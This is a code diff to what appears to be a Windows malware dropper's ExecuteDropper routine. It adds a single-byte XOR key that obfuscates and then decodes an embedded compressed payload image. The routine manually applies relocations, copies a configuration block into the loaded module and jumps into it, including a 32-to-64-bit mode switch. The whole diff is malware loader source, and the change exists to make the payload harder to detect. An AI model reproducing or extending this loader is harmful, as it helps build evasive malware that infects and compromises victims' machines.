@@ -12,6 +12,7 @@
         #define MODULE_IMAGE                 0
         #define MODULE_IMAGE_COMPRESS_SIZE   0
         #define MODULE_IMAGE_DECOMPRESS_SIZE 0
+        #define MODULE_IMAGE_DECOMPRESS_KEY  0
     #endif
 
     DWORD DropperImageExportAddress32[] = {
@@ -23,13 +24,15 @@
 
     enum {
         DropperImageCompressSize32   = MODULE_IMAGE_COMPRESS_SIZE,
-        DropperImageDecompressSize32 = MODULE_IMAGE_DECOMPRESS_SIZE
+        DropperImageDecompressSize32 = MODULE_IMAGE_DECOMPRESS_SIZE,
+        DropperImageDecompressKey32  = MODULE_IMAGE_DECOMPRESS_KEY
     };
 
     #undef MODULE_BASERELOC
     #undef MODULE_IMAGE
     #undef MODULE_IMAGE_COMPRESS_SIZE
     #undef MODULE_IMAGE_DECOMPRESS_SIZE
+    #undef MODULE_IMAGE_DECOMPRESS_KEY
 #pragma endregion
 
 #pragma region x64
@@ -38,6 +41,7 @@
         #define MODULE_IMAGE                 0
         #define MODULE_IMAGE_COMPRESS_SIZE   0
         #define MODULE_IMAGE_DECOMPRESS_SIZE 0
+        #define MODULE_IMAGE_DECOMPRESS_KEY  0
     #endif
 
     DWORD DropperImageExportAddress64[] = {
@@ -49,13 +53,15 @@
 
     enum {
         DropperImageCompressSize64   = MODULE_IMAGE_COMPRESS_SIZE,
-        DropperImageDecompressSize64 = MODULE_IMAGE_DECOMPRESS_SIZE
+        DropperImageDecompressSize64 = MODULE_IMAGE_DECOMPRESS_SIZE,
+        DropperImageDecompressKey64  = MODULE_IMAGE_DECOMPRESS_KEY
     };
 
     #undef MODULE_BASERELOC
     #undef MODULE_IMAGE
     #undef MODULE_IMAGE_COMPRESS_SIZE
     #undef MODULE_IMAGE_DECOMPRESS_SIZE
+    #undef MODULE_IMAGE_DECOMPRESS_KEY
 #pragma endregion
 
 BOOL
@@ -67,6 +73,7 @@ ExecuteDropper(VOID)
     PVOID  ImageReloc;
     SIZE_T cbCompressed;
     SIZE_T cbDecompressed;
+    BYTE   cbDecompressedKey;
     SIZE_T cbImageReloc;
 
 #if SCFG_CORE_DROPPER_FORCE_X86 == ON
@@ -74,17 +81,19 @@ ExecuteDropper(VOID)
 #else
     if (Config.Cpu.bUnderWow64) {
 #endif
-        Image          = &DropperImage64;
-        ImageReloc     = &DropperImageReloc64;
-        cbCompressed   = DropperImageCompressSize64;
-        cbDecompressed = DropperImageDecompressSize64;
-        cbImageReloc   = sizeof(DropperImageReloc64);
+        Image             = &DropperImage64;
+        ImageReloc        = &DropperImageReloc64;
+        cbCompressed      = DropperImageCompressSize64;
+        cbDecompressed    = DropperImageDecompressSize64;
+        cbDecompressedKey = DropperImageDecompressKey64;
+        cbImageReloc      = sizeof(DropperImageReloc64);
     } else {
-        Image          = &DropperImage32;
-        ImageReloc     = &DropperImageReloc32;
-        cbCompressed   = DropperImageCompressSize32;
-        cbDecompressed = DropperImageDecompressSize32;
-        cbImageReloc   = sizeof(DropperImageReloc32);
+        Image             = &DropperImage32;
+        ImageReloc        = &DropperImageReloc32;
+        cbCompressed      = DropperImageCompressSize32;
+        cbDecompressed    = DropperImageDecompressSize32;
+        cbDecompressedKey = DropperImageDecompressKey32;
+        cbImageReloc      = sizeof(DropperImageReloc32);
     }
 
     PVOID Module = NULL;
@@ -96,6 +105,10 @@ ExecuteDropper(VOID)
     }
 
     $DLOG3(DLG_FLT_DEFAULT, "Address: 0x%p Compressed: %lu B Decompressed: %lu B", Module, cbCompressed, cbDecompressed);
+
+    for (ULONG_PTR i = 0; i != cbCompressed; i++) {
+        ((PBYTE)Image)[i] ^= cbDecompressedKey;
+    }
 
     Lzo1Decompress(Image, cbCompressed, Module);
 
@@ -110,6 +123,10 @@ ExecuteDropper(VOID)
         for (ULONG i = 0; i != NumberOfWords; i++) {
             DWORD dwRelocRva  = dwRelocArray[i] & 0xFFF;
             DWORD dwRelocType = dwRelocArray[i] >> 12;
+
+            if (dwRelocType == IMAGE_REL_BASED_ABSOLUTE) {
+                continue;
+            }
 
             #if SCFG_CORE_DROPPER_FORCE_X86 == ON
                 if (FALSE) {
@@ -142,11 +159,11 @@ ExecuteDropper(VOID)
 #endif
         PVOID64 Address = (PVOID64)((ULONG64_PTR)Module + DropperImageExportAddress64[1]);
 
-        RtlpCompareMemoryInline((PVOID)((ULONG64_PTR)Module + DropperImageExportAddress64[0]), &Config, sizeof(CONFIG));
+        RtlpCopyMemoryInline((PVOID)((ULONG_PTR)Module + DropperImageExportAddress64[0]), &Config, sizeof(CONFIG));
         KiJumpLongMode(Address);
     } else{
         PVOID32 Address = (PVOID32)((ULONG32_PTR)Module + DropperImageExportAddress32[0]);
-        RtlpCompareMemoryInline((PVOID)((ULONG64_PTR)Module + DropperImageExportAddress32[1]), &Config, sizeof(CONFIG));
+        RtlpCopyMemoryInline((PVOID)((ULONG_PTR)Module + DropperImageExportAddress32[1]), &Config, sizeof(CONFIG));
 
         /* the compiler generates jmp */
         __asm {
